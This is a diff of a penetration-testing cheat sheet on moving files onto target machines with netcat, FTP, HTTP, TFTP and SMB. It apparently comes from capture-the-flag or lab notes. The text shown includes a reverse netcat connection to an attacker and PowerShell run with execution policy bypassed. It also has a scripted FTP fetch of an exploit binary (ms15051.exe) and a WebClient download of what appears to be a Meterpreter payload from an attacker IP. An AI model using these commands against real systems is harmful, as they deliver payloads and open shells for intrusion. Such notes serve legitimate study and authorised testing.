@@ -1,9 +1,7 @@
 # File transfert
 
-
-## Nc
-
-Windows
+=============================================================
+## Nc Windows
 
 Upload nc.exe or nc64.exe
 
@@ -19,43 +17,41 @@ Run reverse netcat connection and connect to attacker:
     powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File script.ps1
 
 
-
-## Ftp
-
-Server Linux
+=============================================================
+## Ftp Server Linux
 
     pip install pyftpdlib
     python -m pyftpdlib -p 21
 
 
-Client
+## Ftp Client Linux
 
     ftp 10.10.10.4
 
 
-Script client
+## FTP Script client
 
     echo open 10.10.14.6>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get ms15051.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
 
-## Http
 
-Server Linux
+=============================================================
+## Http server Linux
 
     $ python -m SimpleHTTPServer 8000
 
     $ php -S localhost:8000 -t foo/
   
-Client Unix
+## Http client Unix
 
     wget, fetch, ftp, tftp
 
-Client windows : certutil.exe
+## Http client windows : certutil.exe
 
 
     certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
 
 
-Client windows : powershell System.Net.WebClient
+## Http client windows : powershell System.Net.WebClient
 
     powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')"
 
@@ -67,7 +63,7 @@ Client windows : powershell System.Net.WebClient
     powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File upload.ps1
 
 
-
+=============================================================
 ## Tftp
 
 Server (Complicated to configure...)
@@ -87,8 +83,8 @@ New version of windows: activate it :
     pkgmgr /iu:"TFTP" 
 
 
-
-## SMB server
+=============================================================
+## SMB server linux
 
 Enter smbserver.py, part of the Impacket project [https://github.com/SecureAuthCorp/impacket] 
 [tools/impacket-impacket_0_9_19.zip]
@@ -98,7 +94,7 @@ To launch a simple SMB server on port 445, just specify a share name and the pat
     $ python smbserver.py ROPNOP /root/shells
 
 
-client
+## SMB client windows
 
     smbclient -L 10.10.14.30 --no-pass
     net view \\10.10.14.30
